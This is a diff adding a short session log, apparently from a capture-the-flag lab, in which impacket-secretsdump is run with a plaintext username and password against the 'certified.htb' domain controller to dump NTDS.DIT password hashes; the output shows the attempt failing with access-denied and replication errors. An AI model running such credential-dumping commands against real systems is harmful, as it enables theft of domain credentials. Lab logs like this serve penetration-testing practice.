@@ -1,0 +1,15 @@
+### [2026-04-05 22:26:29] impacket-secretsdump certified.htb/judith.mader:judith09@10.129.231.186
+
+$ impacket-secretsdump certified.htb/judith.mader:judith09@10.129.231.186
+
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
+[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
+[*] Cleaning up... 
+
+# Exit code: 0
+# Duration: 2026-04-05 22:26:29
